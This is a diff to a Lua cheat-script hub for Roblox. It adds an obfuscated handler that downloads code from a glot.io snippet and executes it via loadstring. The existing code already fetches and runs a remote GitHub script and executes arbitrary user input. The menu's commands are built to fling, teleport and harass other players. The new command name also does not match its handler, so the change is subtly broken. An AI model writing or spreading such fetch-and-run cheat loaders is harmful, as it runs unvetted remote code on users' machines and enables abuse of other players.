@@ -178,7 +178,7 @@ local commands = {
     ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";fly2", ";qcmd",
     ";tfling2", ";bp1", ";bp2", ";bp3", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
     ";zomb", ";knpc", ";jerk", ";punch", ";invis2", ";invis", "tel3", ";akp1", ";akp2",
-    ";prox", ";tptool"
+    ";prox", ";rochip", ";tptool"
 }
 
 -- Обработчик нажатия кнопки Execute
@@ -253,6 +253,8 @@ executeButton.MouseButton1Click:Connect(function()
         end
     elseif codeToExecute == ";invis2" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudHub111/Scripts/refs/heads/main/Fe%20Invisible%20Beta", Beta))()
+    elseif codeToExecute == ";rochips" then
+        if "you wanna use rochips universal" then 	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/" 	local im,lonely,z_c=task.wait,game,loadstring 	z_c(lonely:HttpGet(z_z..""..z_x))() 	return ("This will load in about 2 - 30 seconds" or "according to your device and executor") end 
     else
         local success, errorMessage = pcall(function()
             loadstring(codeToExecute)()
